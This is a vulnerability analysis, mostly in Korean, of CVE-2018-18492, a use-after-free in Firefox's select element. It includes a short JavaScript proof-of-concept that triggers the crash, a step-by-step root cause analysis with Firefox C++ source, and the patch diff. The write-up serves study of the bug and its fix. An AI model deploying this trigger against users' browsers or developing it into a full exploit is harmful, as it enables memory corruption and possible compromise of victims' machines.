# CVE-2018-18492: Mozilla Firefox Select Element Use-After-Free

## Description

A use-after-free vulnerability can occur after deleting a selection element due to a weak reference to the select element in the options collection, which gets garbage collected, and results in a potentially exploitable crash

* Patch : https://hg.mozilla.org/mozilla-central/rev/d4f3e119ae841008c1be59e72ee0a058e3803cf3

## Proof-of-Concept

```JS
<script>
    div = document.createElement("div");
	opt = document.createElement("option");
	div.appendChild(opt);
	div.addEventListener("DOMNodeRemoved", function() {
    sel = 0;
    new ArrayBuffer(0x0fffffff);
    alert();
  });
	sel = document.createElement("select");
	sel.options[0] = opt;
</script>
```

## Root Cause Analysis


 주어진 PoC의 실행은 크게 2단계(Setup, Triggering stage)로 구성되며, 그 내용은 다음과 같다.


### Setup Stage

 1. `DIV` element의 생성 (`document.createElement("div")`)
 2. `OPTION` element의 생성 (`document.createElement("option")`)
 3. `OPTION` element가 `DIV` element에 append됨 (`div.appendChild(opt)`)
 4. 생성된 `DIV` element에 대한 `DOMNodeRemoved` listener가 추가됨 (`div.addEventListener("DOMNodeRemoved", ...)`)
 5. `SELECT` element가 추가됨 (`document.createElement("select")`)

### Triggering Stage

 1. Setup-5 단계에서 생성된 `SELECT` element의 `options[0]`을 Setup-2 단계에서 생성한 `OPTION` element로 설정
 2. Trigger-1 단계가 실행되는 순간, Setup-4에서 등록한 event listner가 실행됨 -> `SELECT` element가 `0`으로 초기화됨 (`sel = 0;`)
 3. 이어서 event listner는 `0x0fffffff` 크기의 `ArrayBuffer`를 생성
 4. Crash 발생


### Analysis in Depth

우선 Setup-5의 `SELECT` element가 생성될 때 다음과 같이 `mSelect`에 대한 reference 또한 생성된다.

```C++
   HTMLOptionsCollection::HTMLOptionsCollection(HTMLSelectElement* aSelect)
   {
     // Do not maintain a reference counted reference. When
     // the select goes away, it will let us know.
     mSelect = aSelect;
   }
```

PoC 코드의 `sel.options[0] = opt;` 구문이 실행될 때, `opt` 변수를 새롭게 `options[0]`에 할당하는 것이므로, setter 코드(`HTMLOptionsCollection::IndexedSetter`)가 실행되어야 한다.

이때, Setup-4에서 등록한 `DOMNodeRemoved` listner는 `OPTION` element가 `SELECT` element에 새롭게 할당될 때 실행되는 event handler인데, 이는 `HTMLOptionsCollection` 클래스가 작업을 수행하기 전에 event handler의 내용이 실행된다는 것을 의미한다. 즉, `sel.options[0] = opt;` 구문이 실행될 때, 다음 자바스크립트 코드가 먼저 실행된다.

```JS
function() {
    sel = 0;
    new ArrayBuffer(0x0fffffff);
    alert();
}
```

 여기서 `sel = 0;` 구문은 기존에 참조하고 있던 `SELECT` element의 reference를 삭제한다. 이후 실행되는 `new ArrayBuffer(0x0fffffff);`를 통해 큰 크기의 메모리를 할당함으로써 Firefox의 garbage collector를 실행시킨다. 이어서 gc는 `sel = 0;`으로 인해 reference가 없어진 `SELECT` element를 다음 destructor를 통해 free시키게 된다.


```C++
HTMLSelectElement::~HTMLSelectElement()
{
  mOptions->DropReference();
}
```

이는 곧 `HTMLOptionsCollection`의 멤버 변수 `mSelect`가 free 되었음에도 불구하고 계속해서 해당 변수를 사용함을 의미한다(Use-After-Free의 발생). free된 `mSelect` 변수는 `nsINode::ReplaceOrInsertBefore`에서 사용된다. 패치 코드를 분석해보면 다음과 같이 `mSelect` 변수가 weak reference로서 사용되지 않게끔(`sel = 0`이 실행되더라도 `SELECT` element가 free되지 않게끔) 패치가 되었다.

```diff
@@ -151,15 +146,15 @@ public:
   virtual void GetSupportedNames(nsTArray<nsString>& aNames) override;
   void SetLength(uint32_t aLength, ErrorResult& aError);
 
 private:
   /** The list of options (holds strong references).  This is infallible, so
    * various members such as InsertOptionAt are also infallible. */
   nsTArray<RefPtr<mozilla::dom::HTMLOptionElement> > mElements;
   /** The select element that contains this array */
-  HTMLSelectElement* mSelect;
+  RefPtr<HTMLSelectElement> mSelect;
 };
```
